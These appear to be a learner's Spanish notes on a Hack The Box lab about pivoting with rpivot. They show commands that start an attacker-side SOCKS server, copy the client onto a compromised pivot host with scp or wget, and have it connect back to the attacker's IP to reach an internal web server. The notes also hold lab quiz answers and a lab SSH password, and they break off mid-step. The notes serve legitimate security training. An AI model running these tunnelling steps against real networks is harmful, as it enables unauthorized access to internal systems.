Rpivot permite que una máquina situada dentro de una red corporativa (por ejemplo la que tiene la IP privada 172.16.5.135) haga una conexión saliente a un servidor público al que sí se puede acceder desde Internet. Esa conexión se usa para exponer un puerto local de la máquina interna hacia el servidor público.
Así pues, desde Internet, accedo al puerto del servidor público y, por rpivot, ese tráfico llega al servicio que corre en la máquina interna.

Es como un túnel inverso o un “reverse SOCKS”: el cliente dentro del firewall abre el túnel hacia fuera, el servidor público escucha conexiones entrantes y las reenvía al cliente.
![[Pasted image 20251023162730.png]]

- PIVOT HOST:
	  10.129.202.64
- ATACANTE:
	  10.10.14.18
	  172.16.5.129
- VÍCTIMA:
	  172.16.5.135
## Clonando el recurso "rpivot"

Podemos iniciar nuestro servidor proxy SOCKS rpivot usando el siguiente comando para permitir que el cliente se conecte en el puerto 9999 y escuche en el puerto 9050 las conexiones proxy pivot.

```shell-session
Polika4RM@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
Polika4RM@htb[/htb]$ sudo apt-get install python2.7
```

Si la instalación de Python da error, se deberá descargar con:

```
Polika4RM@htb[/htb]$ sudo apt-get install python2.7
```

```shell-session
Polika4RM@htb[/htb]$ curl https://pyenv.run | bash
Polika4RM@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
Polika4RM@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
Polika4RM@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
Polika4RM@htb[/htb]$ source ~/.bashrc
Polika4RM@htb[/htb]$ pyenv install 2.7
Polika4RM@htb[/htb]$ pyenv shell 2.7
```

Me descargo dos archivos del repositorio:
- server.py:
	  A ejecutar desde la máquina atacante.
- client.py:
	  Lo ejecutaré desde la máquina de dentro de la red.

## Ejecutando server.py desde el atacante
Podemos iniciar nuestro servidor proxy SOCKS rpivot para conectarnos a nuestro cliente en el servidor Ubuntu comprometido usando server.py.
Esta máquina atacante escuchará conexiones entrantes que tendrán origen el servidor Ubuntu. 
```shell-session
Polika4RM@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

En server-ip, este campo es la dirección IP en la que quiero que escuche. Si pongo 0.0.0.0 escuchará en todas las interfaces
## Transfiriendo rpivot al Target
Antes de ejecutar client.py, necesitamos transferir rpivot al destino. Podemos hacerlo con este comando SCP:
```shell-session
Polika4RM@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

## Ejecutando client.py desde el Pivot Target

Ejecutaremos:
```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

El server-ip 10.10.14.18 es la IP de la máquina atacante.
## Confirmando la conexión
En el atacante, veré: 
```shell-session
New connection from host 10.129.202.64, source port 35226
```

----

Ahora configuraremos proxychains para que pivote sobre nuestro servidor local en 127.0.0.1:9050 en nuestro host de ataque, que fue iniciado inicialmente por el servidor Python.

```
Polika4RM@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Finalmente, deberíamos poder acceder al servidor web en nuestro servidor, que está alojado en la red interna 172.16.5.0/23 en 172.16.5.135:80, usando proxychains y Firefox.

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

Al igual que con el proxy pivote mencionado anteriormente, podrían darse situaciones en las que no podamos migrar directamente a un servidor externo (host de ataque) en la nube. Algunas organizaciones tienen un proxy HTTP con autenticación NTLM configurado con el controlador de dominio. En tales casos, podemos proporcionar una opción adicional de autenticación NTLM a rpivot para que se autentique a través del proxy NTLM, proporcionando un nombre de usuario y una contraseña. En estos casos, podríamos usar el archivo client.py de rpivot de la siguiente manera:

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
---

**Target:**
**1. From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**
Respuesta: Attack Host

**2. From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**
Respuesta: Pivot Host


**SSH to 10.129.140.64 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"**
**3. Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.**

Me descargo:
```
git clone https://github.com/klsecservices/rpivot.git
```

```
Polika4RM@htb[/htb]$ sudo apt-get install python2.7
```

```shell-session
Polika4RM@htb[/htb]$ curl https://pyenv.run | bash
Polika4RM@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
Polika4RM@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
Polika4RM@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
Polika4RM@htb[/htb]$ source ~/.bashrc
Polika4RM@htb[/htb]$ pyenv install 2.7
Polika4RM@htb[/htb]$ pyenv shell 2.7
```


Desde el atacante ejecuto el server.py:
```
┌──(polika4r㉿kali)-[~/rpivot]
└─$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Comparto la carpeta rpivot:
```
┌──(polika4r㉿kali)-[~/rpivot]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.140.64 - - [23/Oct/2025 17:00:26] "GET /client.py HTTP/1.1" 200 -

```

Y desde el target pivot recibo la carpeta (de forma recursiva), con:
```
ubuntu@WEB01:~$ wget -r http://10.10.14.43:8000/rpivot
```

```
ubuntu@WEB01:~/10.10.14.43:8000/rpivot$ python2.7 client.py --server-ip 10.10.14.43 --server-port 9999
Backconnecting to server 10.10.14.43 port 9999

```

En el atacante aparecerá:
```
┌──(polika4r㉿kali)-[~/rpivot]
└─$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
New connection from host 10.129.140.64, source port 39978
```

Me aseguro que el proxychains está bien seteado:
```
┌──(polika4r㉿kali)-[~]
└─$ tail -4 /etc/proxychains4.conf                      
# meanwile
# defaults set to "tor"
```

En otra sesión de SHH aparte, ejecuto para ver la red interna:
```
buntu@WEB01:~$ ip a
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:14:19 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.129/23 brd 172.16.5.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:1419/64 scope link 
       valid_lft forever preferred_lft forever

```

La cual es: 172.16.5.129/23

172.16.5.135 -p80


Desde el atacante ejecuto:
